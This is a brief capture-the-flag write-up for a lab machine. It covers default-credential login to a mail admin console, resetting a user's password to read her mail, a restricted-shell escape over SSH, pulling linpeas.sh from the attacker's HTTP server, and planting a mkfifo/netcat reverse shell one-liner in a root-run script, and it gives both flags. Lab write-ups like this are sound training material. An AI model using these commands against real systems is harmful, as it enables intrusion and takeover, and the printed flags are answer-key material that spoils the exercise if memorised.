We start by enumerating with nmap and finding some useful mail ports and a port 4555 that I was able to access with netcat:
```
nc 10.0.0.60 4555
```
I was able to login with the credentials ```root:root```, find some users and change there email passwords:
```
list users
setpassword mindy 123456

```
I then used telnet to access mindy's mailbox and read her emails which had her ssh password.
We then ssh'd into the machine as mindy; however we had the jailbreak the machine and so we retried with the '-t bash' parameter:
```
ssh mindy@10.0.0.60 -t bash
```
We were able to get the user flag: ```914d0a4ebc1777889b5b89a23f556fd75```

From that we set up a python http server and downloaded linpeas.sh onto the target machine:
```
python -m http.server --bind 10.0.0.1

wget http://10.0.0.1:8000/linpeas.sh
```
From there we found a binary that was being run as root in the /opt folder called tmp.py.
We modified the file  and added a reverse shell one liner to it; then we set up a netcat listenter:
```
os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 8443 >/tmp/f')

nc -nlvp 8443
```
We wait to catch a reverse shell and attain root access
root flag: ```b4c9723a28899b1c45db281d99cc87c9```

System has been rooted action is no longer required.
